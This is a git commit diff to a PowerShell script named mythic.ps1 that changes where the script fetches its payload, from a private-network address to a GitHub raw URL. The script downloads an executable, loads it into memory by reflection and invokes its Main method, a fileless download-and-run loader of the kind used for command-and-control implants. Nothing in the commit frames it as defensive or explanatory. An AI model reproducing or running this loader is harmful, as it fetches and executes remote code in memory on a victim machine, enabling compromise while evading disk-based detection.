f81c0b0b5dae5ccd9f7f2a80aa5b5d1dc86b93c5
Amarjit Labhuram <amarjit.labhuram@gmail.com>
2022-05-30 16:12:54 +0300

    Update mythic.ps1

--- mythic.ps1
+++ mythic.ps1
@@ -1,4 +1,4 @@
-$bytes = (Invoke-WebRequest -useb "http://10.1.1.5:7070/digitalocean.exe").Content;
+$bytes = (Invoke-WebRequest -useb "https://github.com/chr0n1k/AL2021/blob/main/digitalocean.exe?raw=true").Content;
 $assembly = [System.Reflection.Assembly]::Load($bytes);
 $entryPointMethod = $assembly.GetType('QUAPCI.Program', [Reflection.BindingFlags] 'Public, NonPublic').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic');
 $entryPointMethod.Invoke($null, (, [string[]] ('', '')));
